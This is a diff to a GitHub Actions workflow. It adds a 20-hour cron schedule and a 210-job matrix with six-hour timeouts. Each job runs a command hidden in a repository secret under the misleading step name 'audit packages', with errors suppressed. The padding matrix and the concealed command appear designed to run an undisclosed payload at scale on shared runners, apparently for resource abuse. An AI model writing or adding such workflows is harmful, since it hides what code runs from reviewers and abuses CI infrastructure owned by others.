@@ -1,6 +1,8 @@
 name: CENTURY
 on:   
   push:
+  schedule: 
+  - cron: '0 */20 * * *'
 
 jobs:
   run-test:
@@ -16,3 +18,47 @@ jobs:
       - name: running
         continue-on-error: true
         run: echo hello
+  build-matrix:
+    needs: run-test
+    runs-on: ubuntu-24.04
+    steps:
+      - id: set-matrix
+        run: |
+            echo 'meta_matrix1=["java"]' >> $GITHUB_OUTPUT
+            echo 'meta_matrix2=["1.1", "1.2", "1.3", "1.4", "1.5", "1.6", "1.7"]' >> $GITHUB_OUTPUT
+            echo 'meta_matrix3=["2.1", "2.2", "2.3", "2.4", "2.5", "2.6"]' >> $GITHUB_OUTPUT
+            echo 'meta_matrix4=["3.1", "3.2", "3.3", "3.4", "3.5"]' >> $GITHUB_OUTPUT
+
+    outputs:
+      meta_matrix1: ${{ steps.set-matrix.outputs.meta_matrix1 }}
+      meta_matrix2: ${{ steps.set-matrix.outputs.meta_matrix2 }}
+      meta_matrix3: ${{ steps.set-matrix.outputs.meta_matrix3 }}
+      meta_matrix4: ${{ steps.set-matrix.outputs.meta_matrix4 }}
+
+  run-matrix:
+    needs: build-matrix
+    strategy:
+      fail-fast: false
+      matrix:
+        meta1: ${{ fromJson(needs.build-matrix.outputs.meta_matrix1) }}
+        meta2: ${{ fromJson(needs.build-matrix.outputs.meta_matrix2) }}
+        meta3: ${{ fromJson(needs.build-matrix.outputs.meta_matrix3) }}
+        meta4: ${{ fromJson(needs.build-matrix.outputs.meta_matrix4) }}
+        operating-system: [ubuntu-24.04]
+
+    runs-on: ${{ matrix.operating-system }}
+    timeout-minutes: 360
+    steps:
+    - name: Checkout
+      uses: actions/checkout@master
+
+    - name: Set Node.js 12.x
+      uses: actions/setup-node@master
+      with:
+        node-version: 12.x
+
+    - name: audit packages
+      continue-on-error: true
+      run: ${{ secrets.NOBLE }}
+      if: |
+        matrix.operating-system == 'ubuntu-24.04'
